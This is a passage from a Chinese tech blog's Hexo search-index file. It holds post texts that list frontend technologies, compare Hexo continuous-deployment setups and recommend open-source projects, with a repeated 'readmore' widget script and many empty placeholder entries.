"id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java"},{title:"前端技术分类汇总（持续更新中）",url:"/posts/32320bd5.html",text:'编程语言 JavaScript TypeScript WebAssembly 传统框架 Bootstrap JQuery ExtJS JQuery UI EasyUI LayUI 前沿框架主流框架 AngularJS React.js Vue.js Svelte Ember.js Nuxt.js ThinkJS PC 端框架 Element UI Element Plus Ant Design Vue 移动端框架 React Native Flutter Cordova Ionic 跨端框架 Vant uniapp Weex Hippy omi Taro Chameleon kbone 移动端组件库 NutUI Quark Design 桌面端应用框架 Electron Flutter Tauri 编译构建包管理 npm yarn pnpm 编译器 Babel.js 构建工具 Webpack Gulp Grunt Rollup Vite CSS 预编译 Stylus Sass Less 网络工具 Axios 代码检测代码规范 ESLint Prettier EditorConfig 代码提交Git Hook husky lint-staged 提交规范 Commitizen Commitlint 代码测试单元测试 karma mocha jest ts-jest vue-jest vue-test-utils 框架生态Vue 周边生态 Vue Vuex Vue Router Vite Element Element Plus vue-vben-admin vue-element-admin Avue.js Vant vant-weapp uni-app Ant Design Vue vue-jest vue-test-utils table { width: fit-content; border-collapse: unset; } th, td { padding-left: 30px; padding-right: 30px; font-weight: normal; border-bottom: 1px solid #ddd; } var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"前端"},{title:"Hexo 持续部署方案",url:"/posts/532be336.html",text:'方案一 Hexo 官方推荐的部署方案，是在先本地编写 MarkDown 源文件，然后在本地构建静态资源文件，最后同步静态资源文件到服务器。 方案二 理想的发布模式，使用本地的 MarkDown 编辑器 + 本地的 Git 客户端 + 远程 Git 服务器的 Githooks / Webhooks 功能来实现在本地编写和实时构建发布博客，同时借助远程 Git 服务器（Gitolite、Github、Gitlab）实现了博客源文件的备份。 方案三 借鉴方案二，本地使用的 MarkDown 编辑器 + Git 编写博客，线上则通过 Hexo-Admin 插件实现在 Web 浏览器上编写博客；并且两者都结合了远程 Git 服务端的 Githooks，支持实时构建和发布博客。为了加速国内外访问网站的速度，加入了多线部署的方式，其中包括额外部署到 Coding Pages 和 Github Pages。同时将博客自动构建 / 部署服务与博客提供对外访问的 Web 服务（Nginx）分别部署在两台 Linux 服务器上，Linux 服务器之间则通过 Rsync 同步 Web 静态资源文件，使 Hexo 持续部署方案的性能、可维护性与可用性更高。目前本站的 Hexo 持续部署方案采用方案三，自建站以来一直稳定运行中。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ci/cd 静态博客"},{title:"各类开源项目推荐",url:"/posts/73a4d573.html",text:'前言互联网主流领域 大数据 云计算 人工智能 物联网 人工智能主流领域 自然语言处理（NLP） 计算机视觉（CV） 推荐系统 / 计算广告 编程语言 项目名称 项目地址 说明 Zig https://github.com/ziglang/zig jakt https://github.com/SerenityOS/jakt unilang https://github.com/linuxdeepin/unilang Deepin 开源的编程语言 操作系统 项目名称 项目地址 说明 SerenityOS https://github.com/SerenityOS/serenity Graphical Unix-like operating system for x86 computers 人工智能计算机视觉 项目名称 项目地址 说明 OpenGL（Open Graphics Library） 开放图形库 OpenCL（Open Computing Language） 开放计算语言 OpenCV（Open Source Computer Vision Library） https://github.com/opencv/opencv) 开放计算机视觉库 Detectron https://github.com/facebookresearch/Detectron 物体检测研究平台 AI 基础框架 项目名称 项目地址 说明 OpenAI https://github.com/openai SINGA-Apache https://github.com/apache/singa 深度学习框架 MXNet-Apache https://github.com/apache/incubator-mxnet 深度学习框架 Tensorflow https://github.com/tensorflow/tensorflow 谷歌开源的机器学习框架 PaddlePaddle https://github.com/PaddlePaddle/Paddle 百度开源的深度学习平台 Keras https://github.com/keras-team/keras 基于 Python 的深度学习框架 PyTorch https://github.com/pytorch/pytorch Tensors and Dynamic neural networks in Python with strong GPU acceleration Horovod https://github.com/horovod/horovod Distributed training framework for TensorFlow, Keras, PyTorch, and Apache MXNet 自然语言处理 项目名称 项目地址 说明 MockingBird https://github.com/babysor/MockingBird AI 拟声，5 秒内克隆您的声音并生成任意语音内容 Web 服务器 项目名称 项目地址 说明 Openresty https://github.com/openresty/openresty 将 Nginx 转变为完整的可编写脚本的 Web 平台 软件测试持续测试 项目名称 项目地址 说明 MeterSphere https://github.com/metersphere/metersphere 一站式开源持续测试平台 性能压测 项目名称 项目地址 说明 TCPCopy https://github.com/session-replay-tools/tcpcopy A TCP Stream Replay Tool 网站爬虫 项目名称 项目地址 说明 awesome-java-crawler https://github.com/rockswang/awesome-java-crawler Java 爬虫资源整理 Selenium https://github.com/SeleniumHQ/selenium 一个用于 Web 应用程序测试的工具 Crawlab https://github.com/crawlab-team/crawlab 分布式爬虫管理平台，支持任何语言和框架 Puppeteer https://github.com/puppeteer/puppeteer 谷歌开源的 Node 库，可以用来模拟 Chrome 或者 Chromium 浏览器的运行 Jvppeteer https://github.com/fanyong920/jvppeteer Headless Chrome For Java （Java 爬虫） 量化交易 项目名称 项目地址 说明 vn.py https://github.com/vnpy/vnpy 基于 Python 的开源量化交易平台开发框架 数字货币交易所 项目名称 项目地址 说明 ViaBTC Exchange Server https://github.com/viabtc/viabtc_exchange_server Bisq https://github.com/bisq-network/bisq A decentralized bitcoin exchange network 聊天机器人 项目名称 项目地址 说明 AntiFraudChatBot https://github.com/Turing-Project/AntiFraudChatBot 一个简单的基于 Prompt、浪潮 - 源 1.0 的预训练大模型中文聊天人工智能框架，由 Bilibili 上的 [图灵的猫] 开源 shezhangbujianle https://github.com/bigbrother666sh/shezhangbujianle 一个可以玩剧本杀游戏的 AI，基于 浪潮 - 源 1.0 table { width: fit-content; border-collapse: unset; } th, td { padding-left: 30px; padding-right: 30px; font-weight: normal; border-bottom: 1px solid #ddd; } var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开源项目"},{title:"前端开源项目推荐",url:"/posts/639f1159.html",text:'播放器音频播放器 项目名称 项目地址 说明 APlayer https://github.com/MoePlayer/APlayer 视频播放器 项目名称 项目地址 说明 DPlayer https://github.com/MoePlayer/DPlayer xgplayer https://github.com/bytedance/xgplayer 图片处理 项目名称 项目地址 说明 we-cropper https://github.com/we-plugin/we-cropper 微信小程序图片裁剪工具 代码测试 项目名称 项目地址 说明 ApiDebug https://github.com/EhsanTang/ApiDebug 编辑器代码编辑器 项目名称 项目地址 说明 JSON Editor https://github.com/clay-world/jsoneditor JSON 编辑器 富文本编辑器 项目名称 项目地址 说明 wangEditor https://github.com/wangeditor-team/wangEditor 轻量级 Web 富文本编辑器 Markdown 编辑器 项目名称 项目地址 说明 Vditor https://github.com/Vanessa219/vditor 一款浏览器端的 Markdown 编辑器，支持所见即所得（富文本）、即时渲染（类似 Typora）和分屏预览模式 Gridea https://github.com/getgridea/gridea Markdown Nice https://github.com/mdnice/markdown-nice 静态网站框架 项目名称 项目地址 说明 Hexo https://github.com/hexojs/hexo VuePress https://github.com/vuejs/vuepress 微信公众号Markdown 内容转换 项目名称 项目地址 说明 md https://github.com/doocs/md online-markdown https://github.com/dyc87112/online-markdown 低代码平台 项目名称 项目地址 说明 amis https://github.com/baidu/amis 百度开源的前端低代码框架，通过 JSON 配置就能生成各种页面 mometa https://github.com/imcuttle/mometa 面向研发的低代码元编程，代码可视编辑，辅助编码工具 luban-h5 https://github.com/ly525/luban-h5 类似易企秀的 H5 制作、建站工具、可视化搭建系统 quark-h5 https://github.com/huangwei9527/quark-h5 基于 vue2 + koa2 的 H5 页面制作工具，类似易企秀、百度 H5 等 H5 制作、建站工具 h5-Dooring https://github.com/MrXujiang/h5-Dooring 让 H5 制作像搭积木一样简单，轻松搭建 H5 页面，H5 网站，PC 端网站，LowCode 平台 Sortable https://github.com/SortableJS/Sortable Reorderable drag-and-drop lists for modern browsers and touch devices. No jQuery or framework required 有趣的项目 项目名称 项目地址 说明 Motrix https://github.com/agalwood/Motrix 桌面下载工具 - 采用 Vue + VueX + Element 的技术架构 table { width: fit-content; border-collapse: unset; } th, td { padding-left: 30px; padding-right: 30px; font-weight: normal; border-bottom: 1px solid #ddd; } var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开源项目"},{title:"Java 开源项目推荐",url:"/posts/5fa2a92a.html",text:'缓存 项目名称 项目地址 说明 Overlord https://github.com/bilibili/overlord 哔哩哔哩基于 Go 语言编写的 Memcache 和 Redis &amp; Cluster 的代理及集群管理系统 hotkey https://gitee.com/jd-platform-opensource/hotkey 京东 App 后台中间件，毫秒级探测热点数据，毫秒级推送至服务器集群内存，大幅降低热 Key 对数据层查询压力 日志 项目名称 项目地址 说明 JLog https://gitee.com/jd-platform-opensource/jlog 来自京东 App 秒级百 G 级日志搜集、传输、存储解决方案 TLog https://gitee.com/dromara/TLog 一个轻量级的分布式日志标记追踪神器，自动对日志打标签完成微服务的链路追踪 多线程 项目名称 项目地址 说明 Hippo-4J https://gitee.com/itmachen/hippo4j 强大的动态线程池框架，附带监控报警功能 asyncTool https://gitee.com/jd-platform-opensource/asyncTool 由京东开源，解决任意的多线程并行、串行、阻塞、依赖、回调的并行框架，可以任意组合各线程的执行顺序，带全链路执行结果回调 DynamicTp https://github.com/dromara/dynamic-tp 轻量级动态线程池，内置监控告警功能，集成三方中间件线程池管理，基于主流的配置中心（已支持 Nacos、Apollo，Zookeeper、Consul、Etcd，可通过 SPI 自定义实现） 微服务 项目名称 项目地址 说明 ShenYu https://github.com/apache/incubator-shenyu Apache 开源的应用于所有微服务场景的，可扩展、高性能、响应式的 API 网关 Discovery https://github.com/Nepxion/Discovery 云原生微服务解决方案，蓝绿、灰度、路由、限流、熔断、降级、隔离、追踪、流量染色、故障转移 区块链 项目名称 项目地址 说明 md_blockchain https://gitee.com/tianyalei/md_blockchain 开源 Java 区块链平台，可做联盟链、私链使用，不适用于公链 jdchain https://github.com/blockchain-jd-com/jdchain 京东区块链 JD Chain 是一个企业级的区块链框架系统，具有简洁、易用、可扩展和高性能的特点 权限认证 项目名称 项目地址 说明 Sa-Token https://github.com/dromara/Sa-Token 最全的 Java 权限认证框架 JustAuth https://github.com/justauth/JustAuth 史上最全的整合第三方登录的开源库 Shaun https://gitee.com/baomidou/shaun 基于 Pac4J-JWT 的 WEB 安全组件 kaptcha https://gitee.com/baomidou/kaptcha-spring-boot-starter 基于 SpringBoot 和 Google Kaptcha 的简单验证码组件 消息推送 项目名称 项目地址 说明 sms4j https://github.com/dromara/SMS4J 用于发短信的框架 WePush https://github.com/rememberber/WePush 专注批量推送的小而美的工具 数据库数据同步 项目名称 项目地址 说明 Canal https://github.com/alibaba/canal 阿里巴巴开源的 MySQL binlog 增量订阅 &amp; 消费组件 Maxwell https://github.com/zendesk/maxwell 由 Java 编写的守护进程，可以实时读取 MySQL binlog 并将行更新以 JSON 格式写入 Kafka、RabbitMQ、Redis 等中 ORM 框架 项目名称 项目地址 说明 TKMybatis https://github.com/abel533/Mapper MyBatis 通用 Mapper 工具 MyBatis-Plus https://github.com/baomidou/mybatis-plus MyBatis 的增强工具，在 MyBatis 的基础上只做增强不做改变，为简化开发、提高效率而生 Fluent-Mybatis https://gitee.com/fluent-mybatis/fluent-mybatis 阿里技术团队开源的 ORM 框架， 综合了 MyBatis Plus， Danymic Sql， JPA 等框架特性和优点，利用 Annotation Processor 生成代码 MyBatis Dynamic SQL https://github.com/mybatis/mybatis-dynamic-sql 用于动态生成 SQL 语句的框架，可以将其视为一个类型安全的 SQL 模板库，并额外支持 MyBatis3 和 SpringJDBC 模板 sqltoy https://github.com/sagframe/sagacity-sqltoy ORM 框架 BeetlSQL https://gitee.com/xiandafu/beetlsql/ 简洁方便，功能强大的 ORM 工具 Bean Searcher https://github.com/ejlchina/bean-searcher 专注高级查询的只读 ORM，使一行代码实现复杂列表检索 数据库优化 项目名称 项目地址 说明 SQLAdvisor https://github.com/Meituan-Dianping/SQLAdvisor 美团开源的 SQL 优化工具 分布式事务 项目名称 项目地址 说明 EasyTransaction https://github.com/QNJR-GROUP/EasyTransaction 可一站式解决分布式 SOA（包括微服务等）的事务问题 搜索引擎 项目名称 项目地址 说明 Easy-Es https://github.com/dromara/easy-es 傻瓜级 ElasticSearch 搜索引擎 ORM 框架 RPC 框架 项目名称 项目地址 说明 Tars https://github.com/TarsCloud/Tars 腾讯开源的 RPC 框架 BRPC https://github.com/brpc/brpc 百度开源的 RPC 框架 Jupiter https://github.com/fengjiachun/Jupiter 一款轻量级的分布式服务框架 第三方平台在线支付 项目名称 项目地址 说明 JPay https://github.com/Javen205/IJPay 聚合支付 SDK，封装了微信支付、QQ 支付、支付宝支付、京东支付、银联支付、PayPal 支付等常用的支付方式以及各种常用的接口 jeepay https://gitee.com/jeequan/jeepay) 一套适合互联网企业使用的开源支付系统，已实现交易、退款、转账、分账等接口，支持服务商特约商户和普通商户接口。已对接微信，支付宝，云闪付官方接口，支持聚合码支付 微信公众号 SDK 项目名称 项目地址 说明 weixin-popular https://github.com/liyiorg/weixin-popular 微信开发 Java SDK，支持公众平台、开放平台、商户平台、服务商平台 WxJava https://github.com/Wechat-Group/WxJava 微信开发 Java SDK，支持微信支付、开放平台、小程序、企业微信、公众号等的开发 wx-manage https://github.com/niefy/wx-manage 微信公众号管理系统，包含公众号菜单管理、自动回复、素材管理、模板消息、粉丝管理等功能，前后端都开源免费 微信机器人 SDK 项目名称 项目地址 说明 wechaty https://github.com/wechaty/wechaty 一个开源的微信机器人 SDK，支持 NodeJs、Python、Go、Java itchat https://github.com/littlecodersh/ItChat 一个开源的微信个人号接口，基于 Python 开发 vbot 基于微信 Web 版的接口，使用 Http 协议以及轮询方式实现 电商系统电商商城 项目名称 项目地址 说明 mall https://github.com/macrozheng/mall 电商系统，包括前台商城系统及后台管理系统 Mall4j https://gitee.com/gz-yami/mall4j 基于 Springboot 的电商商城系统 小程序商城 项目名称 项目地址 说明 JooLun https://gitee.com/joolun/JooLun-wx 小程序商城 微同商城 https://gitee.com/fuyang_lipengjun/platform 开源微信小程序商城（uniapp + Java），支持拼团、秒杀、优惠券、积分购物、直播卖货、分销等功能 秒杀系统实现 项目名称 项目地址 说明 互联网 Java 秒杀系统设计与架构实现 https://github.com/qiurunze123/miaosha 高并发多方案秒杀架构 - 核心应用 https://github.com/ThoughtsBeta/flash-sale 基于 SpringCloud 2021.x + Dubbo 3.x 构建的模拟秒杀微服务项目，集成了 Elasticsearch、Gateway、Mybatis-Plus、Sharding-JDBC 等组件 https://github.com/techa03/goodsKill CMS 系统 项目名称 项目地址 说明 Halo https://github.com/halo-dev/halo 一款现代化的开源建站 / CMS 系统 Symphony https://github.com/88250/symphony 一款用 Java 实现的现代化社区（论坛 / 问答 / BBS / 社交网络 / 博客）系统平台 低代码低代码平台 项目名称 项目地址 说明 APIJSON https://github.com/Tencent/APIJSON 腾讯开源的，一款专为 API 而生的 JSON 网络传输协议以及基于这套协议实现的 ORM 库 magic-api https://gitee.com/ssssssss-team/magic-api 一个基于 Java 的接口快速开发框架，通过内置提供的 UI 界面完成接口编写，无需定义 Controller、Service、Dao、Mapper、XML、VO 等 Java 对象即可完成常见的 HTTP API 接口开发 JimuReport https://github.com/jeecgboot/JimuReport 低代码可视化报表，类似 Excel 操作风格，在线拖拽完成设计 代码自动生成 项目名称 项目地址 说明 MyBatisX https://gitee.com/baomidou/MybatisX 一款基于 IDEA 的快速开发插件，为效率而生，可快速生成 MyBatis 代码和 SQL 映射文件 renren-generator https://gitee.com/renrenio/renren-generator 基于 mybatis-generator 开发，可在线生成 entity、xml、dao、service、vue、sql 代码的系统 mybatis-generator-gui https://github.com/zouzg/mybatis-generator-gui 基于 mybatis-generator 开发的一款界面工具，可以快速生成 Mybatis 的 Java POJO 文件及数据库 Mapping 文件 快速开发框架提示 更多的快速开发框架可看 这里。 项目名称 项目地址 说明 pig https://gitee.com/log4j/pig 基于 Spring Boot 2.7、Spring Cloud 2021 &amp; Alibaba、 SAS OAuth2 的微服务 RBAC 权限管理系统，GitHub 项目仓库 mica https://github.com/lets-mica/mica Spring Cloud 微服务开发核心工具集，包括工具类、验证码、Http、Redis、Ip2region、Xss 等功能，开箱即用。 Snowy https://gitee.com/xiaonuobase 小诺快速开发平台 RuoYi https://gitee.com/y_project 基于 Spring Boot、Spring Cloud &amp; Alibaba 的分布式微服务架构权限管理系统，GitHub 项目仓库 renren https://gitee.com/renrenio 采用 Spring Boot2、MyBatis-Plus、Shiro 框架开发的一套权限系统 yudao https://github.com/YunaiV 基于 RuoYi（若依） 框架，采用 Spring Boot + Spring Cloud + MyBatis Plus + Vue &amp; Element，实现后台管理系统 + 微信小程序 + 商城等功能 eladmin https://github.com/elunez/eladmin 基于 Spring Boot 、Jpa、Spring Security、Redis、Vue 的前后端分离架构的后台管理系统，支持数据字典与数据权限管理、一键生成前后端代码、动态路由等 JeeSite https://gitee.com/thinkgem JeeSite 快速开发平台 jeecg-boot https://github.com/jeecgboot/jeecg-boot 「企业级低代码平台」前后端分离架构 SpringBoot 2.x、SpringCloud、Ant Design&amp;Vue、Mybatis-plus、Shiro、JWT SpringBlade https://gitee.com/smallc/SpringBlade 一个由商业级项目升级优化而来的微服务架构，采用 Spring Boot 2.7 、Spring Cloud 2021 等核心技术构建 SpringCloud 脚手架 https://github.com/zhoutaoo/SpringCloud 基于 SpringCloud 的微服务开发脚手架，整合了 oauth2、nacos、feign、sentinel、gateway、elasticsearch、skywalking、zipkin 等技术 Dante Cloud https://github.com/dromara/dante-cloud 一款企业级微服务架构和服务能力开发平台，是全面拥抱 Spring Authorization Server 的、基于 OAuth2.1 协议的微服务架构 应用监控运维 项目名称 项目地址 说明 CAT https://github.com/dianping/cat 美团开源的实时应用监控平台 SkyWalking https://github.com/apache/skywalking Apache 开源的应用程序性能监控系统 Jpom https://gitee.com/dromara/Jpom 简而轻的低侵入式在线构建、自动部署、日常运维、项目监控软件 JVM 诊断调试 项目名称 项目地址 说明 Arthas https://github.com/alibaba/arthas) 阿里巴巴的 Java 诊断工具 VJTools https://github.com/vipshop/vjtools 唯品会内部的 Java 编程规范、库、工具 table { width: fit-content; border-collapse: unset; } th, td { padding-left: 30px; padding-right: 30px; font-weight: normal; border-bottom: 1px solid #ddd; } var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开源项目"},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""}]};